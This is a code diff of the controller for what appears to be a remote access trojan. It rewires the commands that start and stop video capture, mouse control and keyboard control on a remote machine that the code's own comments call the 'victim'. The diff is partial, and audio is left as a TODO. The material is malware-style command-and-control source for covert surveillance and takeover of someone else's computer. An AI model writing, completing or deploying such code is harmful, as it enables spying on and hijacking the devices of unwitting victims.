@@ -95,26 +95,26 @@ def handleCommand(cmd, mainSock):
 			return
 		if args[1] == "start":
 			if args[0] == "video":
-				startVideoStream(mainSock) # this function will send the listening port number
+				gui.toggleVideo(True, mainSock) # tells victim to start video
 			elif args[0] == "audio":
-				startAudioStream(mainSock) # this function will send the listening port number
+				print("TODO - NOT YET IMPLEMENTED")
 			elif args[0] == "mouse":
-				startMouseControl(mainSock) # this function will send the listening port number
+				mainSock.sendall(bytes([START_MOUSE]) + b'\0')
+				gui.toggleMouse(True, mainSock)
 			elif args[0] == "keys":
-				startKeysControl(mainSock) # this function will send the listening port number
+				mainSock.sendall(bytes([START_KEYS]) + b'\0')
+				gui.toggleKeyboard(True, mainSock)
 		elif args[1] == "stop":
 			if args[0] == "video":
-				mainSock.sendall(bytes([END_VIDEO, 0]))
-				# TODO - kill local thread for receiving video stream
+				gui.toggleVideo(False, mainSock) # tells victim to end video, keys, and mouse
 			elif args[0] == "audio":
-				mainSock.sendall(bytes([END_AUDIO, 0]))
-				# TODO - kill local thread for receiving video stream
+				print("TODO - NOT YET IMPLEMENTED")
 			elif args[0] == "mouse":
-				mainSock.sendall(bytes([END_MOUSE, 0]))
-				# TODO - kill local thread for receiving video stream
+				mainSock.sendall(bytes([END_MOUSE]) + b'\0')
+				gui.toggleMouse(False, mainSock)
 			elif args[0] == "keys":
-				mainSock.sendall(bytes([END_KEYS, 0]))
-				# TODO - kill local thread for receiving video stream
+				mainSock.sendall(bytes([END_KEYS]) + b'\0')
+				gui.toggleKeyboard(False, mainSock)
 		else:
 			print("Incorrect command usage! Use \"help\" to see commands")
 	elif cmd == "terminate":
@@ -132,8 +132,10 @@ def main():
 	mainSock = utils.openConnection(SERVER_PORT)
 
 	# start a separate thread to listen for info received on the main socket
+	print("Starting listen thread")
 	mainListenThread = mainSockThread(mainSock)
 	mainListenThread.start()
+	print("Listen thread started")
 
 	# main command loop
 	cmd = input(f"{currDir}>")
